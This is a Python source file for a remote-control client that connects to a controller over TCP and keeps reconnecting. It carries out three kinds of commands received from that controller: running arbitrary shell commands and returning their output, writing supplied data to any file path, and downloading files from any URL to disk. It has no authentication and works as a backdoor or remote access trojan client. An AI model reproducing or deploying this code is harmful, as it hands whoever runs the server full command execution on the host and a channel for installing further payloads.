import time
import threading
import subprocess
from MTcpTranClient import TcpTranClient
import wget
'''
pip install -i https://pypi.tuna.tsinghua.edu.cn/simple/ wget
'''


class RCee :
    def __err__(self,stde,mye) :
        self.Error.append((stde,mye))
    def Geterr(self) :
        return self.Error
    
    def __init__(self,Host,Port) :
        self.Error=[]
        self.rcee=TcpTranClient()
        self.Host=Host
        self.Port=Port
        self.connect()

    
    def __match__(self,Str,LStr,RStr) :
        LPos=Str.find(LStr)
        if LStr=="" :
            LPos=0
        if LPos==-1 :
            return ""
        RPos=Str.find(RStr,LPos)
        if RStr=="" :
            RPos=len(Str)
        if RPos==-1 :
            return ""
        return Str[LPos+len(LStr):RPos]
    
    def connect(self):
        Fg=self.rcee.Connect(self.Host,self.Port)
        while Fg==False :
            time.sleep(5)
            Fg=self.rcee.Connect(self.Host,self.Port)
        print("connect success...")
    
    def CMDSHELL(self,Dic) :
        data=Dic.get("Data")
        ID=self.__match__(data,"ID:","\n")
        CMD=self.__match__(data,"CMD:","\n")
        if data==None or CMD==None :
            self.rcee.Send(data="ID:"+ID+"\n"+"STATE:"+"FAILED",packname="CMDSHELL")
            return
        RES=subprocess.getoutput(CMD)
        self.rcee.Send(data="ID:"+ID+"\n"+"STATE:"+RES,packname="CMDSHELL")
    def FILETRAN(self,Dic) :
        data=Dic.get("Data")
        ID=self.__match__(data,"ID:","\n")
        SAVEPATH=self.__match__(data,"SAVEPATH:","\n")
        TEXT=self.__match__(data,"TEXT:","") # 直到末尾
        if data==None or SAVEPATH==None :
            self.rcee.Send(data="ID:"+ID+"\n"+"STATE:"+"FAILED",packname="FILETRAN")
            return
        try :
            File=open(SAVEPATH,"wb")
            File.write(bytes(TEXT.encode()))
            self.rcee.Send(data="ID:"+ID+"\n"+"STATE:"+"SUCCESS",packname="FILETRAN")
        except Exception as e:
            self.__err__(e,"保存文件失败")
            self.rcee.Send(data="ID:"+ID+"\n"+"STATE:"+"FAILED",packname="FILETRAN")
    def URLDOWN(self,Dic) :
        data=Dic.get("Data")
        ID=self.__match__(data,"ID:","\n")
        SAVEPATH=self.__match__(data,"SAVEPATH:","\n")
        URL=self.__match__(data,"URL:","")
        print(ID,SAVEPATH,URL)
        if data==None or SAVEPATH==None or URL==None:
            self.rcee.Send(data="ID:"+ID+"\n"+"STATE:"+"FAILED",packname="URLDOWN")
            return
        try :
            wget.download(URL,SAVEPATH)
            self.rcee.Send(data="ID:"+ID+"\n"+"STATE:"+"SUCCESS",packname="URLDOWN")
        except Exception as e :
            self.__err__(e,"从URL下载文件失败")
            self.rcee.Send(data="ID:"+ID+"\n"+"STATE:"+"FAILED",packname="URLDOWN")
        
    def MAIN(self) :
        while True :
            print("新的一轮...")
            Dic=self.rcee.Recv()
            if Dic=={}:
                print("断开连接.")
                self.rcee=TcpTranClient()
                self.connect()
                continue
            print("接受到了一个数据包:",Dic)
            DicName=Dic.get("PackName")
            if DicName==None :
                continue
            if DicName=="CMDSHELL" :
                t=threading.Thread(target=self.CMDSHELL,kwargs={"Dic":Dic})
                t.start()
            if DicName=="FILETRAN" :
                t=threading.Thread(target=self.FILETRAN,kwargs={"Dic":Dic})
                t.start()
            if DicName=="URLDOWN" :
                t=threading.Thread(target=self.URLDOWN,kwargs={"Dic":Dic})
                t.start()


def main() :

    rcee=RCee("127.0.0.1",29191)
    rcee.MAIN()

if __name__=="__main__" :
    main()
